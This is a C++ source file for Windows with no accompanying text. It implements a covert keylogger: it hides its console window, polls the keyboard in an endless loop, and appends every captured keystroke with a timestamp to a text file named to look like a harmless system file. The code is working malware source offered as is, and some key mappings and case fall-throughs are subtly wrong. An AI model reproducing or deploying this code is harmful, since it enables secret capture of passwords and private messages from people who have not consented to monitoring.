#include<iostream>
#include<fstream>
#include<windows.h>
#include<winuser.h>
#include<unistd.h>
#include<time.h>
using namespace std;
void hide()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}
void strokes()
{
    time_t tym = time(NULL);
    char key_pressed;
    for(;;)
    {
        Sleep(0);
        for( key_pressed=8; key_pressed<128; key_pressed++ )
        {
            if(GetAsyncKeyState(key_pressed) == -32767)
            {
                ofstream write("C:\\Users\\HP\\GCCwindows.txt", ios::app);
                write << ctime(&tym);
                if( (key_pressed>64 && key_pressed<91) && !(GetAsyncKeyState(0x10)) )
                {
                    key_pressed+=32;
                    write << key_pressed;
                    break;
                }
                else if (key_pressed>64 && key_pressed<91)
                {
                    write << key_pressed;
                    break;
                }
                else
                {
                    switch (key_pressed)
                    {
                        case 8: {write << "<backspace>";}
                            break;
                        case 9: {write << "   ";}
                            break;
                        case 13: {write << "\n";}
                            break;
                        case 11: {write << "<v tab>";}
                            break;
                        case 24: {write << "<cancel>";}
                            break;
                        case 32: {write << " ";}
                            break;
                        case 50:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "@";
                                }
                                else
                                {
                                    write << "2";
                                }
                            }
                            break;
                        case 49:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "!";
                                }
                                else
                                {
                                    write << "1";
                                }
                            }
                            break;
                        case 51:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "#";
                                }
                                else
                                {
                                    write << "3";
                                }
                            }
                            break;
                        case 52: {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "$";
                                }
                                else
                                {
                                    write << "4";
                                }
                            }
                            break;
                        case 53:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "%";
                                }
                                else
                                {
                                    write << "5";
                                }
                            }
                            break;
                        case 54:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "^";
                                }
                                else
                                {
                                    write << "6";
                                }
                            }
                            break;
                        case 55:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "&";
                                }
                                else
                                {
                                    write << "7";
                                }
                            }
                            break;
                        case 56:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "*";
                                }
                                else
                                {
                                    write << "8";
                                }
                            }
                            break;
                        case 57:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "(";
                                }
                                else
                                {
                                    write << "9";
                                }
                            }
                            break;
                        case 48:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << ")";
                                }
                                else
                                {
                                    write << "0";
                                }
                            }
                            break;
                        case 45:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "_";
                                }
                                else
                                {
                                    write << "-";
                                }
                            }
                            break;
                        case 61:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "+";
                                }
                                else
                                {
                                    write << "=";
                                }
                            }
                            break;
                        case 44:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "<";
                                }
                                else
                                {
                                    write << ",";
                                }
                            }
                            break;
                        case 46:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << ">";
                                }
                                else
                                {
                                    write << ".";
                                }
                            }
                            break;
                        case 59:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << ":";
                                }
                                else
                                {
                                    write << ";";
                                }
                            }
                            break;
                        case 47:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "\?";
                                }
                                else
                                {
                                    write << "/";
                                }
                            }
                            break;
                        case 91:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "{";
                                }
                                else
                                {
                                    write << "[";
                                }
                            }
                            break;
                        case 93:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "}";
                                }
                                else
                                {
                                    write << "]";
                                }
                            }
                            break;
                        case 92:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "|";
                                }
                                else
                                {
                                    write << "\\";
                                }
                            }
                            break;
                        case 96:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "~";
                                }
                                else
                                {
                                    write << "`";
                                }
                            }
                        case 39:
                            {
                                if( GetAsyncKeyState(0x10) )
                                {
                                    write << "\"";
                                }
                                else
                                {
                                    write << "\'";
                                }
                            }
                        //default: write << "<nd>";
                    }
                }
            }
        }
    }
}
int main()
{
    hide();
    strokes();
    return 0;
}

